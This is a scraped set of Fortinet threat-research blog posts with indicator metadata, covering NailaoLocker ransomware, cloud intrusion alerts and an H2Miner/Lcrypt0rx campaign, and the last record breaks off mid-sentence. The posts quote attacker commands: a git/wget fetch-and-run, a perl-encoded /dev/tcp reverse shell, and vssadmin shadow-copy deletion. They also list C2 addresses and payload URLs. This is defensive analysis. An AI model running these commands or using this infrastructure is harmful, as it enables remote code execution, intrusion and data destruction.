[
  {
    "id": "Fortinet_57824",
    "source": "Fortinet",
    "title": "FortiGuard Labs Threat Research",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs analyzes NailaoLocker ransomware, a unique variant using SM2 encryption and a built-in decryption function. Learn how it works, why it matters, and how Fortinet protects against it. ByKuan-Yen LiuandYen-Ting LeeJuly 18, 2025 FortiGuard Labs Threat Research FortiCNAPP Composite Alerts link weak signals into clear timelines—helping security teams detect cloud-native threats earlier and triage them faster. ByDavid AdamsonJuly 17, 2025 FortiGuard Labs Threat Research FortiCNAPP Labs uncovers Lcrypt0rx, a likely AI-generated ransomware variant used in updated H2Miner campaigns targeting cloud resources for Monero mining. ByAkshat PradhanJuly 16, 2025 FortiGuard Labs Threat Research Discover how FortiSandbox 5.0 detects Dark 101 ransomware, even with sandbox evasion tactics. Learn how advanced behavioral analysis blocks file encryption, system tampering, and ransom note deployment. ByBryan LuJuly 14, 2025 FortiGuard Labs Threat Research Explore how AI is changing the cat-and-mouse dynamic of cybersecurity, from cracking obfuscation and legacy languages to challenging new malware built with Flutter, Rust, and Delphi. ByAxelle ApvrilleJuly 10, 2025 FortiGuard Labs Threat Research FortiGuard Labs explores how NordDragonScan utilizes an effective distribution network for dissemination. Learn more. ByCara LinJuly 07, 2025 FortiGuard Labs Threat Research FortiGuard Labs analyzes RondoDox, a stealthy new botnet targeting TBK DVRs and Four-Faith routers via CVE-2024-3721 and CVE-2024-12856. Learn how it evades detection, establishes persistence, and mimics gaming and VPN traffic to launch DDoS attacks. ByVincent LiJuly 03, 2025 FortiGuard Labs Threat Research Threat actor impersonates Colombian government to deliver DCRAT via phishing email, using obfuscation, steganography, and PowerShell payload chains. ByAriel LitvakJuly 01, 2025 FortiGuard Labs Threat Research Explore a detailed technical analysis of a Havoc Remote Access Trojan (RAT) variant used in a targeted cyberattack against Middle East critical national infrastructure. Learn how Fortinet detects and protects against Havoc-based threats. ByXiaopeng ZhangandJohn SimmonsJune 23, 2025 FortiGuard Labs Threat Research FortiGuard Labs has uncovered an ongoing cyberattack, targeting companies in Taiwan using phishing emails disguised as tax-related communications. Read more. ByPei Han LiaoJune 17, 2025 Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research",
      "scraped_at": "2025-07-20T13:39:52.214182",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2024-3721",
          "CVE-2024-12856"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.5120481927710844
    }
  },
  {
    "id": "Fortinet_99547",
    "source": "Fortinet",
    "title": "NailaoLocker Ransomware’s “Cheese”",
    "text": "FortiGuard Labs Threat Research Built-In Decryption or Just Another Trap? Affected Platforms: Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Most files on the compromised machines are encryptedSeverity Level:High FortiGuard Labs recently ran across NailaoLocker, a ransomware variant targeting Microsoft Windows systems. Like many ransomware families, it uses AES-256-CBC to encrypt user files. What sets it apart is the presence of hard-coded SM2 cryptographic keys and a built-in decryption function—an uncommon combination that raises immediate questions about intent. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The name “Nailao,” which means “cheese” in Chinese, may be more than a naming quirk. This ransomware could represent a rare opportunity: a payload with embedded recoverability. Or it could be bait—a trap laid to mislead victims and security researchers. One victim’s solution may, in this case, be another’s cheese. In this blog, we examine NailaoLocker’s complete technical profile, including its execution flow, encryption and decryption routines, and use of SM2 cryptography. We assess whether this variant introduces a genuine threat or exposes an exploitable flaw. NailaoLocker is delivered to the target system as a set of three files: Execution begins when the attacker triggers usysdiag.exe, which loads the malicious sensapi.dll using a DLL side-loading technique. This DLL decrypts and loads the actual ransomware payload (usysdiag.exe.dat) directly into memory. To minimize forensic traces, NailaoLoader frees its own library from memory and deletes sensapi.dll immediately after execution. To prevent multiple instances from running simultaneously, NailaoLocker creates a mutex named lockv7. After loading, NailaoLocker checks a hard-coded value against the string \"XXXX\" to determine which mode to activate: encryption or decryption. This variant does not support command-line arguments for mode selection, indicating that the switch is built-in and may be reserved for internal use or testing. Before execution proceeds, the ransomware performs a series of setup tasks. It launches a console window to display real-time status updates, signaling no intent to conceal its activity. It also creates a log file at %ProgramData%\\lock.log, where it records progress throughout the encryption or decryption process. In encryption mode, the ransomware retrieves the ransom note from its own binary using a simple XOR decoding routine. This note is later dropped into the affected directories. To optimize performance, NailaoLocker uses a multi-threaded architecture coordinated through Windows I/O Completion Ports (IOCP). This design enables high-throughput encryption or decryption across multiple processor cores. An I/O Completion Port is initialized by calling CreateIoCompletionPort(). The main thread performs file system traversal and submits target file handles to the IOCP queue. Meanwhile, each worker thread waits for a handle to appear in the queue. When a file is received, the thread proceeds with encryption or decryption as appropriate. This model decouples file discovery from processing, allowing the ransomware to efficiently scale across available CPU resources. The GetSystemInfo() function is invoked to determine the number of logical processors available on the system. Using this information, the ransomware creates at least eight worker threads to handle concurrent file operations. This guarantees a baseline level of parallelism, even on lower-core systems. In the next section, we examine the two distinct execution modes—encryption and decryption—and provide a detailed analysis of their functionality. A distinctive feature of this NailaoLocker variant is its inclusion of a hard-coded SM2 key pair embedded in ASN.1 DER format. These keys are used during both encryption and decryption. As shown in Figure 1, the embedded key structure contains a public key and a private key. The public key, based on elliptic curve cryptography, includes x and y coordinates that define a point on the SM2 curve. The private key—rarely seen in ransomware samples—is also present, suggesting a potential test build or alternate use case. After extraction, the keys are initialized using the OpenSSL function EVP_PKEY_CTX_new(). Mapping from the hard-coded string “SM2”, the numerical identifier is set to 0x494 and is passed to the encryption function. This is further supported by the presence of the expected curve OID—06 08 2A 81 1C CF 55 01 82 2D—within the ASN.1 structure. When running in encryption mode, NailaoLocker performs two primary tasks: identifying target files and encrypting them using AES-256-CBC. It also appends a ransom note to each affected directory. NailaoLocker begins by enumerating all logical drives on the system. It recursively searches accessible directories for files to encrypt, while deliberately skipping specific system paths and file types to avoid destabilizing the infected host. Excluded file extensions: Excluded directories and files: Once a target file is identified, its handle is pushed to the IO Completion Port queue for processing by a worker thread. A ransom note is also dropped into each of the enumerated directories. Each file sent to the I/O Completion Port is processed by a worker thread, which executes the encryption routine using a unique AES key and IV. At the start of each thread, NailaoLocker allocates memory for 38 _OWORD (16-byte) elements. This space is used to store the AES key, IV, their SM2-encrypted versions, and related metadata. The ransomware uses BCryptGenRandom() to generate a 32-byte AES key and a 16-byte IV for each file: These values are used for file encryption with the AES-256-CBC algorithm. Instead of securing the AES key and IV with RSA, as is common in ransomware, NailaoLocker uses SM2, an elliptic curve cryptographic algorithm. This appears to be the first documented case of SM2 being used to protect symmetric file encryption keys in ransomware. Because SM2 does not produce a fixed-length output, the ransomware stores the sizes of the encrypted AES key and IV in two _WORD fields. The full memory layout includes: For each target file, NailaoLocker appends the .locked extension and sets the file attribute to FILE_ATTRIBUTE_HIDDEN. It then reads up to 0x10000 bytes (64 KB) of data per operation. The ransomware performs encryption using the AES-256-CBC algorithm through OpenSSL’s EVP interface. The process includes: The encrypted data replaces the original content. To facilitate decryption, the ransomware assigns a LARGE_INTEGER (8 bytes) to hold the original file size. This value is stored in thefirst 8 bytesof the encrypted file, allowing the decryptor to navigate to the footer containing key material. After the encrypted payload, the ransomware appends a structured footer. It begins with a 4-byte marker 47 56 37 00 (\"LV7\") to indicate the start of the encryption key section. The original file content was shifted to storing the file size. Also, the encryption padding extends the file size. These bytes are not able to fit in the space before the “LV7” flag and are placed after the encrypted AES key and IV. Following the \"LV7\" marker, NailaoLocker stores all remaining cryptographic and overflow data in a fixed sequence. This layout is color-coded in Figure 15: Once encryption is complete, NailaoLocker restores the file’s original last edit timestamp and renames it with the .locked extension (if not already applied). It then prints the total encryption duration to the console in the format done [time], where [time] represents the duration of the encryption operation. In decryption mode, the ransomware requires the SM2 private key to reconstruct the AES key and IV, which are stored at the end of each encrypted file. It then traverses each directory to find encrypted files and performs the decryption process to restore them to their original status. In this section, we will detail the process and validate the correctness of the built-in ASN.1 DER format of the SM2 private key. To initiate decryption mode, we modify the hard-coded value to be the same as \"XXXX,\" prompting the ransomware to switch modes. Upon switching to decryption mode, the file traversal function is adjusted to search for files with the \".locked\" extension, adding them to the IO Completion Port queue for processing. Again, at least eight threads are created to accelerate the decryption process. Each thread begins by parsing the footer of the encrypted file. The ransomware locates the \"LV7\" marker and reads the data that follows: The SM2 private key, extracted earlier from the embedded ASN.1 DER block, is used to decrypt both the AES key and IV. Once the AES key and IV are recovered, the file content is decrypted using AES-256-CBC via OpenSSL’s EVP interface: Unfortunately, in testing, the embedded SM2 private key failed to correctly decrypt the AES key, suggesting the key material may be incomplete or deliberately non-functional. However, FortiGuard analysts confirmed that when the correct AES key and IV are manually supplied—captured during encryption—the decryption function performs as expected and successfully restores the original file contents. This analysis provides a detailed technical profile of NailaoLocker, a ransomware variant notable for its embedded SM2 key pair and built-in decryption function. Although the embedded SM2 private key is non-functional in practice, testing confirms that the decryption logic operates correctly when supplied with valid AES key material, indicating this may be an in-development strain or internal test build. The use of the Chinese SM2 cryptographic standard, particularly to protect AES file encryption keys, marks a notable divergence from conventional ransomware practices. FortiGuard Labs will continue to monitor for the further adoption of region-specific algorithms and for signs that NailaoLocker is evolving toward active deployment. FortiGuard Labs detects the NailaoLocker ransomware samples with the following AV signatures: FortiEDR,FortiXDR, andFortiDeceptorprovide additional protection by detecting anomalous behavior, halting malicious encryption attempts in real time, and diverting ransomware away from production environments. All protections are continuously updated based on real-time intelligence shared across Fortinet’s global sensor network, partner CERTs, and trusted threat intelligence alliances. Fortinet recommends all organizations maintain a strong ransomware defense posture that includes: If you feel your organizations has been impacted by NailaoLocker or any other ransomware, our globalIncident Responseteam can assist with detection, containment, remediation, and recovery. 1248c4b352b9b1325ef97435bd38b2f02d21e2c6d494a2218ee363d9874b760746f3029fcc7e2a12253c0cc65e5c58b5f1296df1e364878b178027ab26562d6860133376a7c8e051da787187761e596ce9b3d0cfcea21ed8f434992aa7cb8605 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/nailaolocker-ransomware-cheese",
      "scraped_at": "2025-07-20T13:40:01.205892",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ensapi",
          "sysdiag",
          "ock"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.21978021978021983
    }
  },
  {
    "id": "Fortinet_23572",
    "source": "Fortinet",
    "title": "Improving Cloud Intrusion Detection and Triage with FortiCNAPP Composite Alerts",
    "text": "FortiGuard Labs Threat Research Detect Cloud Intrusions Faster with Correlated Alerts and Contextual Timelines in FortiCNAPP Moderncyberattacks targeting cloud environmentsare increasingly complex and difficult to detect. Attackers often use multi-stage techniques—such as authentication abuse, privilege escalation, command execution, and interaction withcloud-native APIs—to gain and expand access. Each step in this attack chain often mimics legitimate administrative or developer activity, making it extremely difficult to identify malicious intent. Typical attacker behaviors—such as logging in from a new IP address, accessing previously unused cloud services, or executing command-line processes—can appear indistinguishable from routine actions by developers, admins, or automation. Complicating matters, there is often no single signature, rule, or event that definitively indicates a compromise has occurred. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. As a result, cloud intrusion detection requires examining multiple signals in context. A single weak signal may be inconclusive. But when multiple anomalies involve the same users, resources, or compute nodes over a short period, the likelihood of a targeted intrusion increases significantly. This behavioral correlation is what separates real attacks—or evenpenetration testing—from normal workload activity. FortiCNAPPaddresses this challenge by correlating weak indicators into a coherent picture usingComposite Alertsand theObservation Timeline. The sections below examine how these capabilities work in practice, along with real-world examples that illustrate their value in detecting cloud-native intrusions. To improve detection precision and reduce the burden on security analysts, FortiCNAPP has introduced Composite Alerts. This technology identifies intrusions not by detecting a single event, but by aggregating and correlating multiple indicators associated with the same entity over a defined time window. Each Composite Alert compiles a series of detections, such as suspicious logins, first-time use of administrative APIs, or anomalous container behavior, and links them to specific cloud resources, user identities, or compute instances. Applying a correlation window also allows FortiCNAPP to detect patterns that emerge over minutes or hours rather than the milliseconds of traditional attacks. This approach offers several advantages: As a result, security teams can shift away from reactive alert triage and instead engage in informed, prioritized investigation. By presenting correlated signals with contextual metadata and entity linkage, FortiCNAPP enables analysts to focus their time on evaluating credible threats rather than chasing disconnected anomalies, streamlining the path from detection to resolution. To reduce mean time to triage (MTTT), FortiCNAPP provides each Composite Alert in the form of an Observation Timeline. This timeline serves as both evidence and explanation, enabling the analyst to quickly understand why the alert was generated, which entities were involved, and what sequence of events took place. Each Observation Timeline includes two foundational elements: Once FortiCNAPP has identified a primary entity, such as a compromised IAM user, workload, or compute node, it constructs a timeline by aggregating all related observations for that entity across the alert window. For each observation, the timeline includes: By presenting these elements in a concise, ordered structure, the timeline equips the user to assess the threat in context. This makes it easier to answer key questions, such as: This structured format reduces cognitive load by eliminating the need for analysts to manually reconstruct sequences of activity from disparate logs. It also minimizes investigative overhead by clearly presenting relevant behaviors and their associated metadata in context, enabling faster escalation, more accurate threat classification, and higher-confidence incident response decisions. The first alert involves a machine monitored by a FortiCNAPP agent that was flagged as potentially compromised. Potentially Compromised Host Host machines may have been compromised. The following entities are suspected. Hosts: ip-10-123-45-67 The machine suspected of compromise had the hostname ip-10-123-45-67. Additional host details were available to the end user. The timeline begins on May 13 at 12:00 PM, when FortiCNAPP observed a new vulnerable application installed on the host. Two days later, on May 15 at 10:00 AM, the system launched several new child applications—processes not previously seen originating from this parent process. At 10:36 AM, the timeline flagged a possible reverse shell command. Inspection of the associated command line confirmed it: the host initiated an outbound connection to a remote system, granting that system interactive shell access—even if the machine was behind a firewall or otherwise unreachable from the internet. Further activity that day strengthened the case for compromise. At 12:00 PM, the host contacted a known-bad external domain. At 12:51 PM, it resolved the domain to an internal IP, indicating a successful DNS lookup. By 1:00 PM, it had established an anomalous command-line connection to an external server using wget. This suggests the attacker downloaded and executed malicious code from a remote source. The use of wget with the -qO- flag—which suppresses output and streams the response directly to stdout for execution by a child process—further supports the likelihood of malicious behavior. At this stage, the timeline provides strong evidence of compromise. For further validation, analysts could expand the “+19 more” related entities linked to the “New child application launched” detection. Within this expanded set, multiple command lines reveal obfuscated commands designed to download remote code and execute it locally. This example: /usr/bin/git archive --format=zip --prefix=en --exec=`wget -qO /tmp/QrXErNRt http:// 10.203.118.5:8080/sYdelk;chmod +x /tmp/QrXErNRt;/tmp/QrXErNRt;rm -f /tmp/QrXErNRt` --remote=bOCNVQ/ -- abuses git and wget to download remote code to a file in the tmp directory, execute it, and then clean it up. This example: /usr/bin/git archive --format=zip --prefix=HS --exec=`perl -e 'system(pack(qq,H152,,qq, 62617368202d632027303c263138392d3b65786563203138393c3e2f6465762f7463702f31302e3230332e3131382e352f343434343b7368203c26313839203e2631383920323e2631383927,))'` --remote=dspUKieP/ -- also abuses git, but this time it leverages perl to run an obfuscated script. That obfuscated script, when decoded, is the reverse shell command identified by the syscall detection bash -c 0<&189-;exec 189<>/dev/tcp/ 10.203.118.5/4444;sh <&189 >&189 2>&189 The ability to detect highly obfuscated commands as anomalous and incorporate them into the narrative of a larger suspected attack is a key benefit of FortiCNAPP’s Composite Alerts and of the Observation Timeline feature. This second alert involves AWS identities monitored by FortiCNAPP using CloudTrail logs. Potentially Compromised AWS Keys AWS credentials may have been compromised. The following entities are suspected. Users: AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a; Principal Ids: AROAREDACTEDM9V2Q3LXD:firstname.lastname@redactedcompany.com. In this case, the entity suspected of compromise was the identity AssumedRole/123456789012:AWSReservedSSO_AdministratorAccess_b4a9c2f1837e4d1a, specifically as used by firstname.lastname@redactedcompany.com, as indicated by the principal_id. The timeline began on May 27, when this identity called APIs across 17 AWS regions and 28 different AWS services, suggesting reconnaissance activity. On May 28, the same identity made additional API calls from a previously unseen IP address located outside AWS infrastructure. Over the following two hours, FortiCNAPP observed several additional anomalies associated with this identity, including the use of new services, access to previously used services in new regions, and API calls that resulted in errors. Several of the APIs accessed were sensitive for infrastructure and service discovery. The Lacework customer who received this alert confirmed it as a malicious intrusion. What made this case particularly noteworthy was the absence of an obvious “smoking gun.” Unlike the first example, where reverse shell commands and obfuscated payloads clearly indicated malicious activity, this scenario involved a user behaving anomalously over time in ways that resembled legitimate exploration. The suspicious nature of the behavior became apparent only when the events were viewed in aggregate. FortiCNAPP’s ability to detect this threat did not rely on a single decisive signal. Instead, it resulted from correlating multiple weak signals into a structured timeline. This allowed analysts to determine that a critical mass of suspicious behavior had occurred. This example illustrated the power of Composite Alerts. By aggregating low-signal anomalies that might otherwise be dismissed, FortiCNAPP surfaced a high-fidelity detection—catching the intrusion during the early Discovery phase, before the attacker could escalate privileges or cause damage. Composite Alerts enable security teams to focus on meaningful patterns of behavior that indicate real threats, rather than manually correlating isolated detections. By automatically assembling related signals into a coherent, time-ordered timeline, FortiCNAPP reduces the effort required to identify and respond to cloud-native attacks. Analysts no longer need to reconstruct the narrative from scratch. FortiCNAPP delivers it with supporting evidence and clear entity context. This allows security teams to shift from reactive triage to informed, prioritized investigation. By presenting correlated signals with contextual metadata, FortiCNAPP enables your analysts to focus on credible threats rather than chasing unrelated anomalies. In cloud environments, where attacker dwell times are short and lateral movement can occur quickly, timely and structured detection is essential for containing threats before they escalate into breaches or operational disruptions. FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/improving-cloud-intrusion-detection-and-triage-with-forticnapp",
      "scraped_at": "2025-07-20T13:40:09.292659",
      "indicators": {
        "ip_address": [
          "10.203.118.5"
        ],
        "domain": [
          "irstname",
          "edactedcompany"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [
          "firstname.lastname@redactedcompany.com"
        ],
        "url": []
      },
      "threat_score": 0.14830508474576276
    }
  },
  {
    "id": "Fortinet_85395",
    "source": "Fortinet",
    "title": "Old Miner, New Tricks",
    "text": "FortiGuard Labs Threat Research H2miner Resurfaces with Lcrypt0rx Ransomware Affected Platforms:Linux, Windows, ContainersImpacted Users:Any OrganizationImpact:Data Encrypted for Impact, Compute Hijacking, Defacement, Sensitive data stolen. Severity Level:Critical The FortiCNAPP team, part of FortiGuard Labs, recently investigated a cluster of virtual private servers (VPS) used for Monero mining. The identified samples are associated withprior H2miner campaignsthat we documented in 2020 and have since been updated with new configurations. H2Miner is a Crypto mining botnet that has been active since late 2019. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. We also identified a new variant of the Lcryx ransomware, calledLcrypt0rx. Lcryx is a relatively new VBScript-based ransomware strain first observed in November 2024. This family exhibits several unusual characteristics that suggest it may have been generated using AI. This is the first documented instance of operational overlap between H2miner and Lcryx, suggesting the following possibilities: The infrastructure hosts a diverse set of samples, including several commercial tools that target multiple operating systems to maximize financial gain from a victim’s environment. Xmrig miners Lumma stealer Cobalt Strike RustyStealer ScreenConnect The infrastructure uses multiple VPS providers for hosting and Command & Control. 78[.]153[.]140[.]66 HostGlobal plus VPS 80[.]64[.]16[.]241 LIR limited ISP 89[.]208[.]104[.]175 Aeza international VPS 47[.]97[.]113[.]36 Cobalt Strike server hosted by Hangzhou Alibaba Advertising Co. ISP Bitbucket[.]org Used to host payload in repo sadsafsadfsadf/dsfgdsgssdfgdsg 176[.]65[.]137[.]203 Dolphin host VPS. 185[.]156[.]72[.]96 Amadey C2 server hosted by TOV VAIZ PARTNER. ISP 80[.]64[.]18[.]161 Stimul LLC. 207[.]231[.]109[.]252 HostRush VPS. s10[.]krakenfiles[.]com File hosting used for downloading Lcrypt0rx’s wallpaper. This was uploaded on 30-04-2025 104[.]21[.]32[.]1 / softwareshop[.]win Metasploit C2. We suspect the Lcryx family was generated using AI based on the following indicators: We’ve observed growing adoption of large language models (LLMs) by threat actors in recent years. Combined with the widespread availability of commercial tools, this trend has significantly lowered the barrier to entry for cybercriminal activity. In this next section, we will examine some interesting aspects of the identified samples. H2Miner continues to rely heavily on scripts to disable defenses and expand access, ultimately enabling the deployment of miners. Many of these scripts resemble previously documented variants; however, this version has been updated with new deployment URLs. This script includes code blocks that are structurally similar to earlier H2Miner samples used to terminate security software. However, this variant goes further by also targeting database and user application processes. Additionally, it deploysKinsing malware, establishes persistence by registering itself as a service, and attempts to eliminate competing miners by terminating related processes and clearing associated cron entries. The script then checks for an existing cron entry that downloads and executes itself from 80[.]64[.]16[.]241, and adds the entry if it’s missing. Finally, it clears both the current and persistent shell command history to cover its tracks. This script closely resembles earlier H2Miner scripts used to terminate processes and deploy Kinsing malware, but it includes updated URLs. Notably, the script targets theAlibaba Cloud Security Center agentas well as processes andcontainer images running within Docker, indicating an awareness of cloud-specific defenses and containerized environments. This script functions as aKinsing updater. It removes any existing Kinsing installation and redeploys it by downloading and executing a shell script similar in structure to ce.sh. Several additional scripts identified during this investigation reuse code blocks from ce.sh, spr.sh, and cpr.sh. While their specific logic may vary, their ultimate purpose remains consistent: deployingKinsing, a remote access trojan (RAT) commonly used to deliver crypto miners in compromised environments. Description dbc9125192bd1994cbb764f577ba5dda Kinsing RAT linked to 2021 Log4j (CVE-2021-44228) campaigns b3039abf2ad5202f4a9363b418002351 Kinsing RAT linked to Openfire (CVE-2023-32315) attacks in 2023. kinsing_aarch64 da753ebcfe793614129fc11890acedbc Kinsing Sample used in Apache ActiveMQ (CVE-2023-46604) attacks in 2023. libsystem.so ccef46c7edf9131ccffc47bd69eb743b Kinsing rootkit observed in the wild in late 2020. This PowerShell script downloads anXMRig Monero minerfrom 78[.]153[.]140[.]66 and saves it to the system’s temporary directory as sysupdate. It then creates a scheduled task using schtasks with the name\"Update service for Windows Service\"to ensure persistence. The script’s structure closely resembles those used in early 2021 mining campaigns and appears to have been reused for current operations. Notably, this XMRig miner is also deployed by theLcrypt0rx ransomwarevariant. The associated configuration file (ff1706b37fea16d75b739a5396d9ffba) points to theMonero wallet:4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC This wallet has been previously linked to H2Miner campaigns dating back to late 2021, indicating continuity or overlap in its operator. This usage of older scripts and samples with updated configurations and hosting URLs points to a resurgence of older campaigns from2020and2021. Analysis of this sample shows that it follows the following step-by-step process: Lcrypt0rx first checks if it is running with administrator privileges. If not, it relaunches itself with elevated rights using Shell. Application to invoke wscript.exe with the /elevated flag. Once elevated, the script disables a range of system utilities and user protections by modifying the Windows Registry. These include: It also disables the execution of several critical tools: Lcrypt0rx then attempts to establish persistence by adding its full path to theWinlogon Shellregistry key and registering itself as anImage File Execution Options (IFEO)debugger for cmd.exe. However, these attempts fail because the script path is addedwithout prependingwscript.exe, rendering the entries non-functional. Using WMI, the script then forcibly terminates taskmgr.exe, msconfig.exe, and regedit.exe. It also modifies theScancode Mapregistry to disable a wide range of keys, including: Mouse buttons are reversed, and all changes are applied immediately to disrupt user control. Left Windows Disable Left Win Right Windows Disable Right Win Disable Left Ctrl Disable Right Ctrl Disable Left Shift Right Shift Disable Right Shift Disable Left Alt Right Alt (AltGr) Disable Right Alt Delete (Ext) Disable Delete Null? (invalid) Malformed entry? Disable F10 Next, the script marks itself asread-only,hidden, andsystem-protected, and proceeds to overwrite theMaster Boot Record (MBR)—a destructive move that renders the system unbootable. Lcrypt0rx then attempts to disable Windows Defender real-time protection, BitDefender, and Kaspersky. However, the methods used for BitDefender and Kaspersky are ineffective—likely artifacts of LLM hallucinations. The firewall is disabled via netsh. An 8,192-character master key is then generated using ASCII values 1–255, and a per-file salt of equal length is appended to it during the encryption process. This key-salt pair is used to XOR-encode each file’s content. Folders selected for encryption include standard directories and OneDrive backups. System recovery is disrupted by: cmd.exe /c vssadmin delete shadows /all /quietcmd.exe /c wbadmin delete catalog -quiet Next, a ransom note is dropped in multiple locations (Desktop, Documents, Pictures, Videos, Downloads, Music) and opened in Notepad. The message demands$1,000(up from $500 in earlier samples) and shortens the payment deadline from 5 to 3 days. The .onion URL in the note is syntactically incorrect and doesn't match the one shown in the desktop wallpaper, which uses an obsolete V2 TOR address, suggesting a placeholder or reuse by H2Miner actors. An image from https://s10[.]krakenfiles[.]com/uploads/30-04-2025/605q6HLKTv/image[.]jpg is then downloaded and set as the desktop background by editing the HKCU\\Control Panel\\Desktop\\Wallpaper registry key. The TOR address in the image aligns with older Lcryx variants. Lcrypt0rx then establishes fallback persistence by dropping and registering multiple embedded scripts via run keys. This time, persistence works correctly, with the scripts executed using wscript.exe and marked as read-only, system-protected, and hidden. A summary of the scripts is listed below: Description C:\\Windows\\SysWOW64\\msvcr80.dll.bat Ping’s ragebot[.]fun, a game cheat developer site. C:\\Windows\\System32\\systemconfig.exe.vbs Denial-of-Service script that floods the system's network interface’s gateway and ragebot[.]fun with 45 MB HTTP POSTs. C:\\Windows\\advapi32_ext.vbs Uses taskkill to kill targeted processes, including popular AV processes like Avast, Windows Defender, Kaspersky, AVG, Norton, Protegent360, AvGuard, McAfee McShield, etc., in an infinite loop. C:\\Windows\\System32\\USB_bridge.vbs Monitors for any newly connected drive and then copies itself over. Likely a prototype script. C:\\Windows\\CDConnector.vbs Monitors for any connected CD drive and attempts to eject it. C:\\Windows\\System32\\slmgr.bat.vbs Launches itself with the windows hidden and continuously displays a message box demanding ransom payments. It also resets the system time to 00:00, likely in an attempt to confuse system logs. The script then modifies the hosts file to block AV-related domains and disables cmd.exe for the current user by setting: HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\DisableCMD Lcrypt0rx then downloads and executes miners and infostealers before finally entering the encryption routine. This section is not seen in older Lcryx samples. The details about the executables are listed below. Description http://89[.]208[.]104[.]175:5002/ime3[.]exe 9e4f149dae1891f1d22a2cea4f68432e A Trojan with fake Google resources that is primarily used for disabling defences and Monero mining. It modifies the hosts file to block popular AV sites, adds defender whitelisting via PowerShell, removes the MSRT update via wusa.exe, disables Windows updates via sc.exe, creates a service persistence for itself, and escalates privileges via BYOVD technique for the vulnerable driver WinRing0.sys http://89[.]208[.]104[.]175:5002/piperpate[.]exe a729410de4dc397d1fb2ab8f7ae560d3 Lumma stealer. C2s: disciplipna[.]top/eqwu, praetori[.]live/vepr, opusculy[.]top/keaj, scriptao[.]digital/vpep, civitasu[.]run/werrp\", , exitiumt[.]digital/xane, viriatoe[.]live/laopx, brandihx[.]run/lowp, triremeo[.]digital/akds https://bitbucket[.]org/sadsafsadfsadf/dsfgdsgssdfgdsg/downloads/MicrosoftSoftware[.]exe 2726145d4ef3b34d3c3a566177805c39 Injector that checks for debugger and then injects DCRat. http://47[.]97[.]113[.]36:10010/02[.]08[.]2022[.]exe 1aee8a425ea53c571a16b8efde05ba01 Cobalt Strike C2 : 47[.]97[.]113[.]36 http://176[.]65[.]137[.]203/music-play[.]exe B6cd214bb814362694cc48299ebaf0e5 A Trojan that drops .bat files that execute xmrig miners from temp. The IP range also hosts a Metasploit reverse shell for Windows and Linux with C2 callbacks to 176[.]65[.]138[.]172 & softwareshop[.]win. The range also hosts web shells. http://185[.]156[.]72[.]121/test/exe/random[.]exe 0680df49e1866c86697028ea73d28d28 Amadey Infostealer. C2s: 185[.]156[.]72[.]96/te4h2nus/index.php mutex: 006700e5a2ab05704bbb0c589b88924d\" encryption_key: NGEyYjFkNzk0ZTc5YTQ1MzJiNmUyYjY3OTQwOGQyYmI= http://80[.]64[.]18[.]161/files/6051142952/8QivM1I[.]exe d3884cc519c6855ae20d64264d5f6e93 RustyStealer. It also executes multiple PowerShell commands that add folder exclusion for users\\<username> and appdata\\local\\packages to defender, creates runonce and scheduled task persistence for itself. These scripts have minor syntactical errors. http://78[.]153[.]140[.]66/xmrig[.]exe 57f0fdec4d919db0bd4576dc84aec752 Same Xmrig miner that was downloaded by H2miner script 1.ps1 6868c280c61c0b1e2ab8bf6792f1eef2 https://207[.]231[.]109[.]252/bin/support[.]client[.]exe 44143827116c96f5dcace4f95dff8697 ConnectWise ScreenConnect. The config used for Monero mining points to the following wallets for mining payouts: Lcrypt0rx now enters a persistent loop that continuously scans the previously enumerated directories and any attached storage volumes for new files to encrypt. Each file is processed through an encryption routine with multiple checks and conditions. The routine begins by attempting to open the file using the OpenTextFile method in VBScript. This fails for executables, DLLs, and other system-critical formats, which are excluded by default through error handling. Before proceeding, the script verifies whether the file: Files that fail these checks are queued for encryption. To encrypt each file, Lcrypt0rx generates a unique8,192-character saltcomposed of ASCII characters (codes 1–255), which it appends to a pre-generated master key. This is a notable change from earlier Lcryx variants, where the salt length was only 32 characters. The script then XORs each character of the file content with the corresponding character from the combined key-salt pair, producing the obfuscated output. The resulting data is saved to a new file with the .lcryx extension, and the original file is deleted to complete the encryption process. As a final step, Lcrypt0rx checks all targeted folders for files associated with backups. Any files with recognized backup-related extensions are deleted to further prevent recovery. Despite these actions, the ransomware does not transmit or store the encryption keys locally or remotely. Combined with the use of simple XOR encryption, this makes recovery trivial through basic cryptanalysis. The lack of key management, combined with the presence of scare tactics and superficial ransom demands, suggests that Lcrypt0rx operates more asscarewarethan a serious ransomware threat. The H2Miner threat actors have remained active and adaptable since first emerging in late 2019. Their recent campaigns continue to rely on a blend of reused, proven tooling and newly integrated elements, including the curious addition of Lcrypt0rx ransomware. While Lcrypt0rx lacks the sophistication of more advanced ransomware families, it introduces distinct techniques for degrading system usability, UI interference, and redundant embedded 